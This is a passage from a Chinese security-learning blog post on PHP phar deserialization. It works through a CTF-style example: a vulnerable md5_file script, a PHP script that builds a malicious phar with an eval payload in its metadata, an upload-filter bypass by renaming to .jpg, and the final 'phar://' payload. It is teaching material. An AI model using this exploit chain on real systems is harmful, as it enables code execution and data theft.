+<h4 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class TestObject &#123;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        include(&#x27;flag.php&#x27;);</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$filename = $_POST[&#x27;file&#x27;];</span><br><span class="line">if (isset($filename))&#123;</span><br><span class="line">    echo md5_file($filename);</span><br><span class="line">&#125;</span><br><span class="line">//upload.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>upload.php</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212749961.png" alt="image-20250108213945059"></p>
+<p>分析步骤:</p>
+<p>生成一个phar文件;</p>
+<p>在mate-data里放置一个包含TestObject()的序列化字符串</p>
+<p>上传文件;</p>
+<p>md5_file执行phar伪协议,触发反序列化;</p>
+<p>反序列化TestObject()触发__destruct()执行echo $flag</p>
+<p>生成test.phar</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class TestObject &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&#x27;test.phar&#x27;);   //删除之前的test.par文件(如果有)</span><br><span class="line">$phar=new Phar(&#x27;test.phar&#x27;);  //创建一个phar对象，文件名必须以phar为后缀</span><br><span class="line">$phar-&gt;startBuffering();  //开始写文件</span><br><span class="line">$phar-&gt;setStub(&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);  //写入stub</span><br><span class="line">$o=new TestObject();</span><br><span class="line">$o-&gt;output=&#x27;eval($_GET[&quot;a&quot;]);&#x27;;</span><br><span class="line">$phar-&gt;setMetadata($o);//写入meta-data</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现upload界面对文件后缀名有过滤,于是把test.phar改为test.jpg上传</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212750054.png" alt="image-20250108220117439"></p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=phar://upload/test.jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125212750238.png" alt="image-20250108220236217"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">lu1ux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/">http://example.com/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/25/SQL%E5%9F%BA%E7%A1%80/" title="SQL基础"><img class="cover" src="/img/20.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">SQL基础</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="php反序列化"><img class="cover" src="/img/9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">php反序列化</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lu1ux</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lu1ux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">网安小白一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text">一.字符串逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B1%9E%E6%80%A7%E9%80%83%E9%80%B8"><span class="toc-number">1.1.</span> <span class="toc-text">属性逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%8F%E5%B0%91%E9%80%83%E9%80%B8"><span class="toc-number">1.1.1.</span> <span class="toc-text">字符串减少逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A2%9E%E5%8A%A0%E9%80%83%E9%80%B8"><span class="toc-number">1.1.2.</span> <span class="toc-text">字符串增加逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.1.3.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-%E5%A2%9E%E5%8A%A0"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">字符串逃逸_增加</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-%E5%87%8F%E5%B0%91"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">字符串逃逸_减少</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-wakeup-%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">二.__wakeup()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECVE-2016-7124"><span class="toc-number">2.1.</span> <span class="toc-text">1.反序列化漏洞CVE-2016-7124</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-php%E5%BC%95%E7%94%A8%E8%B5%8B%E5%80%BC"><span class="toc-number">2.2.</span> <span class="toc-text">2.php引用赋值&amp;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-fast-destruct"><span class="toc-number">2.3.</span> <span class="toc-text">3.fast-destruct</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BF%AB%E9%80%9F%E6%9E%90%E6%9E%84%E7%9A%84%E5%8E%9F%E7%90%86%EF%BC%9A"><span class="toc-number">2.3.1.</span> <span class="toc-text">快速析构的原理：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-php-issue-9618"><span class="toc-number">2.4.</span> <span class="toc-text">4.php issue#9618</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8C%E7%BB%95%E8%BF%87"><span class="toc-number">2.5.</span> <span class="toc-text">5.使用C绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-bypass%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%AD%A3%E5%88%99"><span class="toc-number">3.</span> <span class="toc-text">三.bypass反序列化正则</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="toc-number">3.1.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B-PHP%E5%BC%95%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">四.PHP引用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">5.</span> <span class="toc-text">五.Session反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%83%85%E5%86%B5%E4%B8%8B%E7%94%A8php%E6%A0%BC%E5%BC%8F%E5%82%A8%E5%AD%98"><span class="toc-number">5.1.</span> <span class="toc-text">默认情况下用php格式储存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A3%B0%E6%98%8E%E5%AD%98%E5%82%A8%E7%B1%BB%E5%9E%8B%E4%B8%BAphp-serialize"><span class="toc-number">5.2.</span> <span class="toc-text">声明存储类型为php_serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A3%B0%E6%98%8E%E5%AD%98%E5%82%A8%E7%B1%BB%E5%9E%8B%E4%B8%BAphp-binary"><span class="toc-number">5.3.</span> <span class="toc-text">声明存储类型为php_binary</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2"><span class="toc-number">5.3.1.</span> <span class="toc-text">例题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">六.phar反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Phar%E7%BB%93%E6%9E%84"><span class="toc-number">6.1.</span> <span class="toc-text">Phar结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">6.2.</span> <span class="toc-text">Phar漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phar%E4%BD%BF%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.3.</span> <span class="toc-text">Phar使用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-3"><span class="toc-number">6.3.1.</span> <span class="toc-text">例题</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/URLDNS/" title="URLDNS"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/11/25/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-11-25T14:03:06.000Z" title="Created 2025-11-25 22:03:06">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/CC%E9%93%BE/" title="CC链"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链"/></a><div class="content"><a class="title" href="/2025/11/25/CC%E9%93%BE/" title="CC链">CC链</a><time datetime="2025-11-25T14:02:54.000Z" title="Created 2025-11-25 22:02:54">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img src="/img/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息泄露"/></a><div class="content"><a class="title" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2025-11-25T13:50:42.000Z" title="Created 2025-11-25 21:50:42">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/upload/" title="upload"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload"/></a><div class="content"><a class="title" href="/2025/11/25/upload/" title="upload">upload</a><time datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/SSRF/" title="SSRF"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/2025/11/25/SSRF/" title="SSRF">SSRF</a><time datetime="2025-11-25T13:44:33.000Z" title="Created 2025-11-25 21:44:33">2025-11-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By lu1ux</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/sakuraPlus.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
